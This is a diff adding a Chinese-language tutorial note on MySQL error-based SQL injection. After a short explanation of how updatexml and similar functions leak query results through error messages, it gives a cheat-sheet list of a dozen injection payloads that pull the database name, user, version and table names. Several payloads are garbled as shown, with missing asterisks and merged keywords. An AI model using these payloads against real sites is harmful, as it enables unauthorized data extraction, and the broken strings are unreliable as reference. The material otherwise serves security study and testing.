@@ -1,0 +1,40 @@
+报错型sql注入
+
+当union select出现不适用的情形下，我们通常使用报错来进行注入。
+
+报错注入的原理就是通过构造特殊的报错语句，使mysql数据库报错，使我们查询的内容显示在报错信息中，同时把报错信息显示在页面上。
+
+常用的报错函数有 updateXML(),extractvalue(),floor()等等。大致报错的原理就是利用输入字符串逻辑上的冲突造成报错。
+
+以updatexml为例：
+
+报错payload: 1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
+
+updatexml(1,2,3)，需要3个参数，1是指查找，2是指xml文档的路径，3是指替换，总体来说就是在一个xml文档的路径2中找1个字符串并且用3替换掉。如果路径出错的话，就会把路径信息通过报错显示在页面上。注入的思路就是要构造一个不存在的路径，在路径中填充我们的sql注入表达式，从而就能把查询的结果输出在报错信息中。
+
+事实上报错注入适用的场景很多，不光是select，insert update delete都会有涉及，并且用的很多。
+
+1、通过floor报错,注入语句如下:  and (select 1 from (select count(),concat((database()),floor(rand(0)2))x from information_schema.tables group by x)a)%23
+
+2、通过ExtractValue报错,注入语句如下:  and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+
+3、通过UpdateXml报错,注入语句如下:  and 1=(updatexml(1,concat(0x3a,(select user())),1))
+
+4、通过NAME_CONST报错,注入语句如下:  and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
+
+5、通过join报错,注入语句如下:  select * from(select * from mysql.user ajoin mysql.user b)c;
+
+6、通过exp报错,注入语句如下:  and exp(~(select * from (select user () ) a) );
+
+7、通过GeometryCollection()报错,注入语句如下:  and GeometryCollection(()select *from(select user () )a)b );
+
+8、通过polygon ()报错,注入语句如下:  and polygon (()select * from(select user ())a)b );
+
+9、通过multipoint ()报错,注入语句如下:  and multipoint (()select * from(select user() )a)b );
+
+10、通过multlinestring ()报错,注入语句如下:  and multlinestring (()select * from(selectuser () )a)b );
+
+11、通过multpolygon ()报错,注入语句如下:  and multpolygon (()select * from(selectuser () )a)b );
+
+12、通过linestring ()报错,注入语句如下:  and linestring (()select * from(select user() )a)b );
+
